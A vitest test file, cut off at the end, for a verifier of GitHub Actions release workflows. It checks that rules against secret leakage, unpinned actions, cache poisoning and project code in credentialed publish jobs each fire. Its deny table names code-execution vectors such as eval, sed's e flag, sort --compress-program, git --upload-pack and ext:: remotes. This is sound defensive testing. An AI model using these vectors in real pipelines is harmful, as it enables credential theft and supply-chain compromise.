// SPDX-License-Identifier: MIT

// The release-pipeline workflow rules (verify-workflows.mjs): the real
// repository is clean, and every rule is seen to fire on a fixture that
// breaks only that rule.

import { spawnSync } from "node:child_process";
import { mkdtempSync, readFileSync, rmSync, writeFileSync } from "node:fs";
import { tmpdir } from "node:os";
import { dirname, join, resolve } from "node:path";
import { fileURLToPath } from "node:url";
import { parse as parseYaml, stringify as stringifyYaml } from "yaml";
import { rowSnapshots } from "./row-snapshots.mjs";
import { afterAll, describe, expect, it } from "vitest";
import {
  CREDENTIALED_COMMANDS,
  GATE_WORKFLOWS,
  MANIFEST,
  SETTINGS,
  allFindings,
  findings,
  gateTriggerProblems,
  globMatches,
  publicGateFindings,
  readLocalActions,
  readScriptOutputs,
  readWorkflows,
  releaseGateFindings,
  verifyWorkflows,
} from "./verify-workflows.mjs";

const ROOT = resolve(dirname(fileURLToPath(import.meta.url)), "..", "..");
const SHA = "34e114876b0b11c390a56381ad16ebd13914f8d5";

const manifest = {
  tagFormat: "sdk-{name}-v{version}",
  publish: [
    { name: "a", registry: "npm" },
    { name: "b", registry: "npm" },
    { name: "c", registry: "none" },
  ],
};
const settings = () => ({
  environments: [
    { name: "sdk-publish-npm", registry: "npm", secrets: [] },
    { name: "cli-release", tagPatterns: ["cli-v*"], secrets: [] },
  ],
  trustBindings: [{ registry: "npm", workflow: "sdk-publish.yml", environment: "sdk-publish-npm" }],
  allowedActions: ["pnpm/action-setup@*"],
  releaseTags: { name: "release tags", include: ["refs/tags/sdk-*", "refs/tags/cli-v*"] },
});
const HEAD = `on:
  push:
    tags: ["sdk-*-v*"]
env:
  NODE_VERSION: "22.23.3"
  NPM_VERSION: "11.20.0"
  # What the fixtures' run blocks read (rule 15), each pinned value with its
  # pinned expression (PINNED_ENV), as the real jobs define it.
  ARTIFACT: \${{ needs.pack-npm.outputs.file }}
  EXPECTED_SHA256: \${{ needs.pack-npm.outputs.sha256 }}
  EXPECTED_SUMS: \${{ needs.pack-npm.outputs.sums }}
  RELEASE_TAG: \${{ needs.setup.outputs.releaseTag }}
  MIRROR_TAG: \${{ needs.setup.outputs.mirrorTag }}
  UNIT_COORDINATES: \${{ needs.setup.outputs.coordinates }}
  UNIT_PATH: \${{ needs.setup.outputs.path }}
  RUST_VERSION: "1.88.0"
`;
const GOOD = `  pack-npm:
    steps:
      - uses: pnpm/action-setup@${SHA}
      - uses: actions/setup-node@${SHA}
        with:
          node-version: \${{ env.NODE_VERSION }}
      - run: pnpm install --frozen-lockfile
  publish-npm:
    if: github.event_name == 'push' && startsWith(github.ref, 'refs/tags/')
    runs-on: ubuntu-latest
    environment: sdk-publish-npm
    permissions:
      id-token: write
    steps:
      - uses: actions/setup-node@${SHA}
        with:
          node-version: \${{ env.NODE_VERSION }}
      - run: npm install --global --ignore-scripts "npm@\${NPM_VERSION}"
      - run: npm publish --ignore-scripts "./release/$ARTIFACT"
`;
const flow = (jobs, head = HEAD) => parseYaml(`${head}jobs:\n${jobs}`);
/**
 * The grammar and allowlist rows run their commands in publish-npm, so the
 * fixture lets every environment run every allowlisted command; the real
 * per-environment table (ENVIRONMENT_COMMANDS) has its own describe below.
 */
const ANY_COMMAND = new Proxy({}, { get: () => Object.keys(CREDENTIALED_COMMANDS) });
const run = (
  jobs,
  { s = settings(), m = manifest, extra = {}, head = HEAD, commands = ANY_COMMAND } = {},
) =>
  findings({
    settings: s,
    manifest: m,
    workflows: { "sdk-publish.yml": flow(jobs, head), ...extra },
    commands,
  }).map((f) => f.why);
const fires = (got, re) => expect(got).toContainEqual(expect.stringMatching(re));
const swap = (from, to) => {
  if (!GOOD.includes(from)) throw new Error(`fixture lacks ${from}`);
  // A replacer function: `$'` and `$&` in a shell fixture are text, not patterns.
  return GOOD.replace(from, () => to);
};
const UPLOAD = 'npm publish --ignore-scripts "./release/$ARTIFACT"';
const PUBLISH_STEP = `      - run: ${UPLOAD}`;
const INSTALL_STEP = "      - run: pnpm install --frozen-lockfile";

/** A Packagist mirror and a Go module tag, declared the way release-settings.json does. */
const withMirrors = () => {
  const m = {
    ...manifest,
    publish: [
      ...manifest.publish,
      { name: "p", registry: "packagist", mirror: { repository: "o/p", releaseTag: "v{version}" } },
      { name: "g", registry: "go", releaseTag: "apps/g/v{version}" },
    ],
  };
  const s = settings();
  s.environments.push(
    { name: "sdk-publish-packagist", registry: "packagist", secrets: [] },
    { name: "sdk-publish-go", registry: "go", secrets: [] },
  );
  s.mirrors = [
    { repository: "o/p", unit: "p", environment: "sdk-publish-packagist", tags: ["refs/tags/v*"] },
  ];
  s.goModuleTags = { include: ["refs/tags/apps/g/v*"], environment: "sdk-publish-go" };
  return { m, s };
};
/** A publish job of the fixture that reads one secret through its env. */
const READS_SECRET = (name) =>
  GOOD.replace(
    "      - run: npm publish",
    `      - env:\n          R2_ACCESS_KEY_ID: \${{ secrets.${name} }}\n        run: test -n "$R2_ACCESS_KEY_ID"\n      - run: npm publish`,
  );

describe("the real repository", () => {
  it("is clean", () => expect(verifyWorkflows(ROOT)).toEqual([]));
});

describe("globMatches", () => {
  it("matches the way a tag filter does", () => {
    expect(globMatches("sdk-a-v*", "sdk-a-v1.0.0")).toBe(true);
    expect(globMatches("sdk-a-v*", "sdk-ab-v1.0.0")).toBe(false);
  });
  it("`*` does not cross a slash", () =>
    expect(globMatches("refs/tags/sdk-*", "refs/tags/sdk-a/x")).toBe(false));
  it("`**` crosses a slash, and a literal dot stays literal", () => {
    expect(globMatches("refs/tags/**", "refs/tags/apps/sdk-go/v1.0.0")).toBe(true);
    expect(globMatches("refs/tags/v*.0", "refs/tags/v1x0")).toBe(false);
  });
  it("refuses a glob character it does not implement", () =>
    expect(() => globMatches("sdk-?", "sdk-a")).toThrow());
});

describe("each rule fires on a fixture that breaks only it", () => {
  it("control: the good fixture is clean", () => expect(run(GOOD)).toEqual([]));

  it("1 an undeclared environment", () =>
    fires(
      run(swap("environment: sdk-publish-npm", "environment: sdk-publish")),
      /does not declare/,
    ));

  it("2 id-token outside an environment", () =>
    fires(
      run(swap("  pack-npm:\n", "  pack-npm:\n    permissions:\n      id-token: write\n")),
      /id-token: write outside/,
    ));
  it("2 id-token granted at the top level", () =>
    fires(
      run(GOOD, { head: `${HEAD}permissions:\n  id-token: write\n` }),
      /grants id-token: write at the top level/,
    ));
  it("2 write-all at the top level", () =>
    fires(run(GOOD, { head: `${HEAD}permissions: write-all\n` }), /at the top level/));
  it.each([
    ["dot syntax", "${{ secrets.X }}"],
    ["bracket syntax", "${{ secrets['X'] }}"],
    ["the whole context", "${{ toJSON(secrets) }}"],
  ])("2 a secret outside an environment (%s)", (_, expr) =>
    fires(
      run(swap(INSTALL_STEP, `      - env:\n          T: ${expr}\n        run: echo`)),
      /secrets context outside/,
    ),
  );
  it("2 a secret at the top level", () =>
    fires(
      run(GOOD, { head: `${HEAD}  T: \${{ secrets.X }}\n` }),
      /secrets context at the top level/,
    ));

  it.each([
    ["pnpm install", "pnpm install", /pnpm is not a command/],
    ["a repository script", "node tools/x.mjs", /node is not a command/],
    ["a build", "pnpm run build", /pnpm is not a command/],
    ["make", "make release", /make is not a command/],
    ["a local executable", "./gradlew publish", /\.\/gradlew is not a command/],
    ["a shell script", "bash scripts/x.sh", /bash is not a command/],
    ["npm ci", "npm ci", /npm runs only `publish`/],
  ])("3 a publish job that runs %s", (_, cmd, why) =>
    fires(run(swap(PUBLISH_STEP, `      - run: ${cmd}`)), why),
  );
  it("3 a publish job's checkout that keeps its credential", () =>
    fires(
      run(swap(PUBLISH_STEP, `      - uses: actions/checkout@${SHA}`)),
      /keeps its credential/,
    ));
  it("3 a publish job's checkout without a credential is allowed", () =>
    expect(
      run(
        swap(
          PUBLISH_STEP,
          `      - uses: actions/checkout@${SHA}\n        with:\n          persist-credentials: false`,
        ),
      ),
    ).toEqual([]));
  it.each([
    ["the publish job", "id-token: write\n    steps:\n      - uses: actions/setup-node"],
    ["the pack job", "  pack-npm:\n    steps:\n      - uses: pnpm/action-setup"],
  ])("3 a cache restored in %s", (_, anchor) => {
    const jobs = anchor.startsWith("  pack-npm")
      ? GOOD.replace(
          `      - uses: pnpm/action-setup@${SHA}\n`,
          `      - uses: pnpm/action-setup@${SHA}\n      - uses: actions/cache@${SHA}\n`,
        )
      : GOOD.replace(
          "      - run: npm install --global",
          `      - uses: actions/cache@${SHA}\n      - run: npm install --global`,
        );
    fires(run(jobs), /restores a cache/);
  });
  it("3 an eval in a pack job", () =>
    fires(run(swap("pnpm install --frozen-lockfile", 'eval "$X"')), /evals a string/));

  it("4 an untrusted trigger", () =>
    fires(
      run(GOOD, { extra: { "x.yml": parseYaml("on: [pull_request_target]\njobs: {}\n") } }),
      /triggers on pull_request_target/,
    ));

  it("5 an expression in a run block", () =>
    fires(
      run(swap("pnpm install --frozen-lockfile", "echo ${{ github.ref_name }}")),
      /interpolates/,
    ));

  it("6 a reusable workflow that binds an environment", () =>
    fires(
      run(GOOD, {
        extra: {
          "r.yml": parseYaml(
            "on: workflow_call\njobs:\n  j:\n    environment: sdk-publish-npm\n    steps: []\n",
          ),
        },
      }),
      /a reusable workflow binds/,
    ));
  it("6 secrets: inherit", () =>
    fires(
      run(GOOD, {
        extra: {
          "c.yml": parseYaml(
            "on: push\njobs:\n  j:\n    uses: ./.github/workflows/r.yml\n    secrets: inherit\n",
          ),
        },
      }),
      /secrets: inherit/,
    ));

  it("7 a tag trigger that misses a unit", () =>
    fires(
      run(GOOD, { head: HEAD.replace('tags: ["sdk-*-v*"]', 'tags: ["sdk-a-v*"]') }),
      /does not match unit b/,
    ));
  it("7 a unit no protected tag pattern covers", () => {
    const s = settings();
    s.releaseTags.include = ["refs/tags/cli-v*"];
    fires(run(GOOD, { s }), /no protected release-tag pattern covers unit a/);
  });
  it("7 a registry with units but no environment", () => {
    const s = settings();
    s.environments = s.environments.filter((e) => e.registry !== "npm");
    s.trustBindings = [];
    fires(
      run(swap("environment: sdk-publish-npm", "environment: cli-release"), { s }),
      /has 0 environments/,
    );
  });
  it("7 an environment with no unit", () => {
    const s = settings();
    s.environments.push({ name: "sdk-publish-pypi", registry: "pypi", secrets: [] });
    fires(run(GOOD, { s }), /sdk-publish-pypi has no unit/);
  });
  it("7 a publish job bound to another registry's environment", () => {
    const s = settings();
    s.environments.push({ name: "sdk-publish-other", registry: "npm2", secrets: [] });
    fires(
      run(swap("environment: sdk-publish-npm", "environment: sdk-publish-other"), { s }),
      /not registry npm's environment/,
    );
  });
  it("7 a job for a registry with no unit", () =>
    fires(
      run(`${GOOD}  pack-hex:\n    steps: []\n`),
      /names registry hex, which has no publish unit/,
    ));
  it("7 a pack job that binds an environment", () =>
    fires(
      run(swap("  pack-npm:\n", "  pack-npm:\n    environment: sdk-publish-npm\n")),
      /a pack job binds an environment/,
    ));
  it("7 a trust binding to another registry's environment", () => {
    const s = settings();
    s.trustBindings[0].environment = "cli-release";
    fires(run(GOOD, { s }), /not that registry's/);
  });
  it("7 a trust binding to a missing workflow", () => {
    const s = settings();
    s.trustBindings[0].workflow = "gone.yml";
    fires(run(GOOD, { s }), /gone.yml, which does not exist/);
  });

  it("8 an action not pinned to a commit SHA", () =>
    fires(
      run(swap(`pnpm/action-setup@${SHA}`, "pnpm/action-setup@v4")),
      /without a full commit SHA/,
    ));
  it("8 an action not on the allow-list", () =>
    fires(
      run(swap(`pnpm/action-setup@${SHA}`, `evil/setup@${SHA}`)),
      /uses evil\/setup, which .* does not allow/,
    ));
  it("8 an allowance nobody uses", () => {
    const s = settings();
    s.allowedActions.push("astral-sh/setup-uv@*");
    fires(run(GOOD, { s }), /allows astral-sh\/setup-uv@\*, which no workflow uses/);
  });

  it("9 a literal npm version instead of the workflow's pin", () =>
    fires(
      run(swap('"npm@${NPM_VERSION}"', "npm@11.20.0")),
      /not the workflow's exact NPM_VERSION/,
    ));
  it("9 a workflow pin that is not exact", () =>
    fires(
      run(GOOD, { head: HEAD.replace('NPM_VERSION: "11.20.0"', 'NPM_VERSION: "11"') }),
      /env NPM_VERSION is 11/,
    ));
  it("9 npx in a pack job", () =>
    fires(run(swap("pnpm install --frozen-lockfile", "npx something")), /through npx/));
  it("10 a relative tarball path without ./ (npm reads it as a GitHub repository)", () =>
    fires(
      run(swap(UPLOAD, 'npm publish --ignore-scripts --access public "release/$ARTIFACT"')),
      /npm publish release\/\$ARTIFACT: a path without/,
    ));
  it.each([
    '"$RUNNER_TEMP"/release/*.tgz',
    "/abs/x.tgz",
    '"./x.tgz"',
    '--dry-run --access public "./x.tgz"',
  ])("10 accepts npm publish %s (in the pack job's dry run)", (arg) =>
    expect(run(swap(INSTALL_STEP, `      - run: npm publish --ignore-scripts ${arg}`))).toEqual([]),
  );
  it.each([
    ["cargo build --release", /cargo is not a command/],
    ['cargo "+${RUST_VERSION}" package', /cargo is not a command/],
    ["dotnet build", /dotnet runs only `nuget push`/],
    ["dotnet pack -c Release", /dotnet runs only `nuget push`/],
    ["gem build confeature.gemspec", /gem runs only `push`/],
    ["uv build", /uv is not a command/],
    ["uvx twine check dist/*", /a glob character/],
    ["dart pub get", /dart is not a command/],
    ["python3 setup.py sdist", /python3 is not a command/],
    ["rake release", /rake is not a command/],
  ])("3 a publish job running %s", (cmd, why) => fires(run(swap(UPLOAD, cmd)), why));
  it.each([
    'dotnet nuget push "./release/${UNIT_COORDINATES}.${UNIT_VERSION}.nupkg" --source https://api.nuget.org/v3/index.json',
    'gem push "./release/$ARTIFACT"',
  ])("3 accepts the registry client upload %s", (cmd) =>
    expect(
      run(
        swap(
          PUBLISH_STEP,
          `      - env:\n          UNIT_VERSION: \${{ needs.setup.outputs.version }}\n        run: ${cmd}`,
        ),
      ),
    ).toEqual([]),
  );
  it.each([
    [
      'cargo "+${RUST_VERSION}" publish --no-verify --manifest-path "${UNIT_PATH}/Cargo.toml"',
      "publish-crates",
    ],
    ['dart pub publish --force --directory "${UNIT_PATH}"', "publish-pubdev"],
  ])("3 a source-only upload (%s) is allowed in %s only", (cmd, job) => {
    const PROJECT = /a credentialed job/;
    // In another publish job it is project code.
    fires(run(swap(UPLOAD, cmd)), PROJECT);
    // In its own job, and nowhere else, it is the recorded exception.
    const own = swap("  publish-npm:\n", `  ${job}:\n`).replace(UPLOAD, cmd);
    // Its pack outputs are its own job's (PINNED_ENV derives pack-<registry>).
    const head = HEAD.replaceAll("needs.pack-npm.", `needs.${job.replace("publish-", "pack-")}.`);
    expect(run(own, { head }).filter((w) => PROJECT.test(w))).toEqual([]);
    // A variant of it is not the exception.
    const variant = own.replace(cmd, `${cmd} && cargo build`);
    fires(run(variant, { head }), PROJECT);
  });
  it("1 a secret its environment does not declare", () =>
    fires(
      run(READS_SECRET("R2_ACCESS_KEY_ID")),
      /reads secret R2_ACCESS_KEY_ID, which environment sdk-publish-npm does not declare/,
    ));
  it("1 a secret its environment declares", () => {
    const s = settings();
    s.environments[0].secrets.push({ name: "R2_ACCESS_KEY_ID", kind: "key-id" });
    expect(run(READS_SECRET("R2_ACCESS_KEY_ID"), { s })).toEqual([]);
  });

  it.each([
    [
      "no cache input on an action that caches by default",
      `      - uses: actions/setup-go@${SHA}\n`,
    ],
    [
      "cache: true",
      `      - uses: actions/setup-go@${SHA}\n        with:\n          cache: true\n`,
    ],
    [
      "a cache path",
      `      - uses: actions/setup-node@${SHA}\n        with:\n          node-version: \${{ env.NODE_VERSION }}\n          cache: pnpm\n`,
    ],
    [
      "a JDK cache (setup-java's cache-jdk)",
      `      - uses: actions/setup-java@${SHA}\n        with:\n          distribution: temurin\n          cache-jdk: true\n`,
    ],
  ])("3 a pack job's cache: %s", (_, step) =>
    fires(run(GOOD.replace(INSTALL_STEP, `${step}${INSTALL_STEP}`)), /restores a cache/),
  );
  it("3 `cache: false` restores nothing", () =>
    expect(
      run(
        GOOD.replace(
          INSTALL_STEP,
          `      - uses: actions/setup-go@${SHA}\n        with:\n          cache: false\n${INSTALL_STEP}`,
        ),
      ),
    ).toEqual([]));
  it("3 setup-java with no cache input, or cache-jdk: false, restores nothing (#902)", () => {
    for (const extra of ["", "          cache-jdk: false\n"])
      expect(
        run(
          GOOD.replace(
            INSTALL_STEP,
            `      - uses: actions/setup-java@${SHA}\n        with:\n          distribution: temurin\n${extra}${INSTALL_STEP}`,
          ),
        ),
      ).toEqual([]);
  });
  it.each([
    ["$UNIT_PATH/gradlew publish", /an unquoted \$/],
    ["(cd apps/sdk-java && ./gradlew publish)", /a \( \) or \{ \}/],
    ["gradle publish", /gradle is not a command/],
    ["mvnw deploy", /mvnw is not a command/],
    ["mvn deploy", /mvn is not a command/],
  ])("3 a publish job running a JVM build (%s)", (cmd, why) =>
    fires(run(swap(PUBLISH_STEP, `      - run: ${cmd}`)), why),
  );
  it.each([
    ["bundle install", /bundle is not a command/],
    ["bundle exec rake release", /bundle is not a command/],
    ["(bundle exec rake)", /a \( \) or \{ \}/],
  ])("3 a publish job running bundler (%s)", (cmd, why) =>
    fires(run(swap(PUBLISH_STEP, `      - run: ${cmd}`)), why),
  );

  it("11 control: a declared mirror and Go module tags are clean", () => {
    const { m, s } = withMirrors();
    expect(run(GOOD, { m, s })).toEqual([]);
  });
  it("11 a mirror in an undeclared environment", () => {
    const { m, s } = withMirrors();
    s.mirrors[0].environment = "sdk-publish-mirror";
    fires(
      run(GOOD, { m, s }),
      /mirror o\/p names environment sdk-publish-mirror, which is not unit p's registry's/,
    );
  });
  it("11 a mirror in another registry's environment", () => {
    const { m, s } = withMirrors();
    s.mirrors[0].environment = "sdk-publish-npm";
    fires(
      run(GOOD, { m, s }),
      /names environment sdk-publish-npm, which is not unit p's registry's/,
    );
  });
  it("11 a mirror whose unit mirrors another repository", () => {
    const { m, s } = withMirrors();
    s.mirrors[0].repository = "o/other";
    fires(run(GOOD, { m, s }), /mirror o\/other names unit p, whose manifest mirror is o\/p/);
  });
  it("11 a mirror naming no unit", () => {
    const { m, s } = withMirrors();
    s.mirrors[0].unit = "gone";
    fires(run(GOOD, { m, s }), /mirror o\/p names unit gone, whose manifest mirror is undefined/);
  });
  it("11 a unit's mirror that the settings do not declare", () => {
    const { m, s } = withMirrors();
    s.mirrors = [];
    fires(run(GOOD, { m, s }), /unit p has a mirror \(o\/p\) that .* does not declare/);
  });
  it("11 a mirror whose tag patterns miss the unit's release tag", () => {
    const { m, s } = withMirrors();
    s.mirrors[0].tags = ["refs/tags/release-*"];
    fires(run(GOOD, { m, s }), /mirror o\/p's tag patterns do not cover refs\/tags\/v1.0.0/);
  });
  it("11 Go module tags bound to another registry's environment", () => {
    const { m, s } = withMirrors();
    s.goModuleTags.environment = "sdk-publish-npm";
    fires(
      run(GOOD, { m, s }),
      /goModuleTags names environment sdk-publish-npm, which is not the go registry's/,
    );
  });
  it("11 Go module tags that miss a Go unit's tag", () => {
    const { m, s } = withMirrors();
    s.goModuleTags.include = ["refs/tags/v*"];
    fires(
      run(GOOD, { m, s }),
      /goModuleTags does not cover unit g's module tag \(refs\/tags\/apps\/g\/v1.0.0\)/,
    );
  });
  it("11 a Go unit with no module tag", () => {
    const { m, s } = withMirrors();
    delete m.publish.find((u) => u.name === "g").releaseTag;
    fires(run(GOOD, { m, s }), /go unit g has no releaseTag/);
  });
  it("11 Go units with no goModuleTags at all", () => {
    const { m, s } = withMirrors();
    delete s.goModuleTags;
    fires(run(GOOD, { m, s }), /goModuleTags names environment undefined/);
  });

  it("9 every *_VERSION pin is exact", () =>
    fires(
      run(GOOD, {
        head: HEAD.replace(
          'NPM_VERSION: "11.20.0"\n',
          'NPM_VERSION: "11.20.0"\n  UV_VERSION: "1.88"\n',
        ),
      }),
      /env UV_VERSION is 1.88, not an exact version/,
    ));
  it("9 a literal node-version in a pack job", () =>
    fires(
      run(GOOD.replaceAll("node-version: ${{ env.NODE_VERSION }}", "node-version: 22")),
      /node-version is 22/,
    ));
});

/** cli-release.yml as the fixture: two jobs bound to `cli-release`, which has no registry. */
const CLI = `on:
  push:
    tags: ["cli-v*"]
env:
  TAG: \${{ github.ref_name }}
jobs:
  upload:
    runs-on: ubuntu-latest
    environment: cli-release
    steps:
      - uses: actions/checkout@${SHA}
        with:
          persist-credentials: false
      - run: bash apps/cli/scripts/publish-r2.sh upload "\${TAG#cli-v}" dist
  promote:
    runs-on: ubuntu-latest
    environment: cli-release
    steps:
      - run: bash apps/cli/scripts/publish-r2.sh promote "\${TAG#cli-v}"
  verify-pinned:
    uses: ./.github/workflows/cli-windows-install-verify.yml
`;
const VERIFY_CALLEE = parseYaml("on: workflow_call\njobs: {}\n");
const runCli = (cli = CLI, jobs = GOOD) =>
  run(jobs, {
    extra: { "cli-release.yml": parseYaml(cli), "cli-windows-install-verify.yml": VERIFY_CALLEE },
  });
const RAN = /a credentialed job/;

describe("rule 3 holds every job bound to an environment, not only a registry's (#794 review)", () => {
  it("control: cli-release's upload and promote, as recorded, are clean", () =>
    expect(runCli()).toEqual([]));
  it("a cli-release job that runs project code", () =>
    fires(
      runCli(
        CLI.replace(
          'promote "${TAG#cli-v}"',
          'promote "${TAG#cli-v}"\n      - run: deno task compile',
        ),
      ),
      RAN,
    ));
  it("a cli-release job whose checkout keeps its credential", () =>
    fires(
      runCli(CLI.replace("        with:\n          persist-credentials: false\n", "")),
      /keeps its credential/,
    ));
  it("a cli-release job that restores a cache", () =>
    fires(
      runCli(
        CLI.replace(
          "      - run: bash apps/cli/scripts/publish-r2.sh promote",
          `      - uses: actions/cache@${SHA}\n      - run: bash apps/cli/scripts/publish-r2.sh promote`,
        ),
      ),
      /restores a cache/,
    ));
  it("publish-r2.sh is the exception in upload and promote only, each with its own verb", () => {
    // The promote command in the upload job is not upload's exception.
    fires(runCli(CLI.replace('upload "${TAG#cli-v}" dist', 'promote "${TAG#cli-v}"')), RAN);
    // A rollback is not recorded anywhere.
    fires(runCli(CLI.replace('promote "${TAG#cli-v}"', 'rollback "${TAG#cli-v}"')), RAN);
    // The same command in sdk-publish.yml is project code.
    fires(
      runCli(
        CLI,
        swap(
          PUBLISH_STEP,
          '      - run: bash apps/cli/scripts/publish-r2.sh promote "${TAG#cli-v}"',
        ),
      ),
      RAN,
    );
    // A prefix assignment or a chained command breaks the exact match.
    fires(
      runCli(
        CLI.replace(
          "- run: bash apps/cli/scripts/publish-r2.sh promote",
          "- run: WRANGLER=x bash apps/cli/scripts/publish-r2.sh promote",
        ),
      ),
      RAN,
    );
  });
});

describe("rule 3: caches that are on unless switched off (#794 review)", () => {
  const UV = (input) =>
    `      - uses: astral-sh/setup-uv@${SHA}\n        with:\n          version: "0.10.7"\n${input}`;
  const withUv = (input) => {
    const s = settings();
    s.allowedActions.push("astral-sh/setup-uv@*");
    return run(GOOD.replace(INSTALL_STEP, `${UV(input)}${INSTALL_STEP}`), { s });
  };
  it.each([
    ["enable-cache: true", "          enable-cache: true\n"],
    ['enable-cache: "auto" (its default)', '          enable-cache: "auto"\n'],
    ["no enable-cache at all", ""],
  ])("setup-uv with %s restores a cache", (_, input) => fires(withUv(input), /restores a cache/));
  it("enable-cache: true on any action is a cache, not only on setup-uv", () =>
    fires(
      run(
        swap(
          `      - uses: pnpm/action-setup@${SHA}\n`,
          `      - uses: pnpm/action-setup@${SHA}\n        with:\n          enable-cache: true\n`,
        ),
      ),
      /restores a cache/,
    ));
  it("setup-uv with enable-cache: false restores nothing", () =>
    expect(withUv("          enable-cache: false\n")).toEqual([]));
  it("bundler-cache: false restores nothing; bundler-cache: true does", () => {
    const s = settings();
    s.allowedActions.push("ruby/setup-ruby@*");
    const ruby = (v) =>
      run(
        GOOD.replace(
          INSTALL_STEP,
          `      - uses: ruby/setup-ruby@${SHA}\n        with:\n          bundler-cache: ${v}\n${INSTALL_STEP}`,
        ),
        { s },
      );
    expect(ruby("false")).toEqual([]);
    fires(ruby("true"), /restores a cache/);
  });
});

/**
 * Why each row of the rule-3 refuses table is refused: the finding's own
 * words, so a row refused by a neighbouring check instead fails (round 4).
 */
/** Each rule-3 row's findings, snapshotted (row-snapshots.mjs). */
const RULE3 = rowSnapshots("rule3-findings.json");
const REASONS = {
  "a backslash continuation": "pnpm is not a command a credentialed job runs",
  "a continuation inside npm's arguments":
    "npm runs only `publish`, or installs itself at NPM_VERSION",
  "an option before npm's subcommand": "npm runs only `publish`, or installs itself at NPM_VERSION",
  "npm publish without --ignore-scripts": "npm publish must run with --ignore-scripts",
  "npm publish --ignore-scripts=false": "npm publish: --ignore-scripts takes no value",
  bunx: "bunx is not a command a credentialed job runs",
  deno: "deno is not a command a credentialed job runs",
  tsx: "tsx is not a command a credentialed job runs",
  "go test": "go is not a command a credentialed job runs",
  source: "source is not a command a credentialed job runs",
  ". (source)": ". is not a command a credentialed job runs",
  "a repository path without ./": "apps/cli/scripts/x.sh is not a command a credentialed job runs",
  "a command substitution":
    "an expansion this grammar does not allow ($(, $((, $', $\" or a special parameter)",
  "a substitution inside a quoted argument":
    "an expansion this grammar does not allow ($(, $((, $', $\" or a special parameter)",
  "a process substitution": "a process substitution",
  "a substitution inside ${ }": "an expansion this grammar does not allow (${ with $, (, { or `)",
  "a backtick substitution": "a backtick command substitution",
  "a variable as the command": "${CMD} is not a command a credentialed job runs",
  eval: "eval is not a command a credentialed job runs",
  exec: "exec is not a command a credentialed job runs",
  env: "env is not a command a credentialed job runs",
  xargs: "xargs is not a command a credentialed job runs",
  "find -exec": "a ( ) or { } (subshell, group, function, arithmetic or brace expansion)",
  "sort --compress-program": "sort: --compress-program is not an option it may take",
  "sed's e flag": "sed runs one single-quoted s/\u2026/\u2026/ script (flag g at most)",
  "sed -e": "sed runs one single-quoted s/\u2026/\u2026/ script (flag g at most)",
  "sed -f": "sed runs one single-quoted s/\u2026/\u2026/ script (flag g at most)",
  "a second sed script": "sed runs one single-quoted s/\u2026/\u2026/ script (flag g at most)",
  "git -c before the subcommand":
    "git: -c is not a global option it may take (--git-dir=publish-tmp/\u2026 only)",
  "git --upload-pack": "git fetch: --upload-pack is not an option it may take",
  "git config": "git runs only init, bundle verify, fetch, push and rev-parse",
  "a loop": "while is not a command a credentialed job runs",
  "a case": "a ;; (case)",
  "a subshell": "a ( ) or { } (subshell, group, function, arithmetic or brace expansion)",
  "a function": "a ( ) or { } (subshell, group, function, arithmetic or brace expansion)",
  export: "export is not a command a credentialed job runs",
  "a prefix assignment": "a credentialed job assigns no variable",
  "an assignment": "a credentialed job assigns no variable",
  "a write to GITHUB_PATH":
    "a credentialed job names GITHUB_ENV, GITHUB_PATH or the runner's temp directory",
  "((\u2026)) read as arithmetic":
    "a ( ) or { } (subshell, group, function, arithmetic or brace expansion)",
  "$((\u2026)) read as arithmetic": "an unquoted $ (every expansion is double-quoted)",
  "case after then": "a ;; (case)",
  "case inside $( )":
    "an expansion this grammar does not allow ($(, $((, $', $\" or a special parameter)",
  "case in a group": "a ;; (case)",
  "case after !": "a ! (negation)",
  "case with in on the next line": "a ;; (case)",
  "ANSI-C quoting": "an unquoted $ (every expansion is double-quoted)",
  '$"\u2026" quoting': "an unquoted $ (every expansion is double-quoted)",
  "a one-line function": "a ( ) or { } (subshell, group, function, arithmetic or brace expansion)",
  "function shadowing an earlier command":
    "a ( ) or { } (subshell, group, function, arithmetic or brace expansion)",
  "a function defined in a skipped branch":
    "a ( ) or { } (subshell, group, function, arithmetic or brace expansion)",
  local: "local is not a command a credentialed job runs",
  read: "read is not a command a credentialed job runs",
  "printf -v": "printf takes no option, and its format is one of '%s\\n', '%s  %s\\n'",
  "for \u2026 in": "for is not a command a credentialed job runs",
  "for without in": "set is not a command a credentialed job runs",
  "an arithmetic for": "a ( ) or { } (subshell, group, function, arithmetic or brace expansion)",
  "${\u2026:=\u2026}":
    "an operator expansion other than ${NAME#\u2026}, ${NAME%\u2026} or ${NAME:-\u2026}",
  "export without a value": "export is not a command a credentialed job runs",
  "export of an expansion": "export is not a command a credentialed job runs",
  "an arithmetic subscript":
    "an expansion this grammar does not allow ($(, $((, $', $\" or a special parameter)",
  "a substring expansion":
    "an operator expansion other than ${NAME#\u2026}, ${NAME%\u2026} or ${NAME:-\u2026}",
  "a funsub": "an operator expansion other than ${NAME#\u2026}, ${NAME%\u2026} or ${NAME:-\u2026}",
  "a valsub": "an operator expansion other than ${NAME#\u2026}, ${NAME%\u2026} or ${NAME:-\u2026}",
  "a substitution inside arithmetic":
    "an expansion this grammar does not allow ($(, $((, $', $\" or a special parameter)",
  "indirect expansion":
    "an operator expansion other than ${NAME#\u2026}, ${NAME%\u2026} or ${NAME:-\u2026}",
  "an option through a variable":
    "git push: the remote must be a literal URL of a repository tools/repo-gates/release-settings.json names",
  "an operand that starts with an expansion":
    'git push: "$X" starts with an expansion, which could become an option',
  "brace expansion": "a ( ) or { } (subshell, group, function, arithmetic or brace expansion)",
  "a glob": "a glob character (* ? [ ])",
  "an abbreviated long option (git)": "git push: --receive-pa is not an option it may take",
  "an abbreviated long option (sort)": "sort: --compress-prog is not an option it may take",
  "git init --template": "git init: --template is not an option it may take",
  "cd before an exception": "cd is not a command a credentialed job runs",
  "GITHUB_ENV through a literal":
    "a credentialed job names GITHUB_ENV, GITHUB_PATH or the runner's temp directory",
  "the runner's file-command directory":
    "a credentialed job names GITHUB_ENV, GITHUB_PATH or the runner's temp directory",
  RUNNER_TEMP: "a credentialed job names GITHUB_ENV, GITHUB_PATH or the runner's temp directory",
  "a write outside publish-tmp":
    "a credentialed job writes only publish-tmp/ or /dev/null (apps/cli/scripts/publish-r2.sh)",
  "rm outside publish-tmp": "rm touches only publish-tmp/",
  "mkdir outside publish-tmp": "mkdir touches only publish-tmp/",
  "an ext:: remote":
    "git push: the remote must be a literal URL of a repository tools/repo-gates/release-settings.json names",
  "an fd:: remote":
    "git fetch: the remote must be a literal URL of a repository tools/repo-gates/release-settings.json names, or a received release/*.bundle",
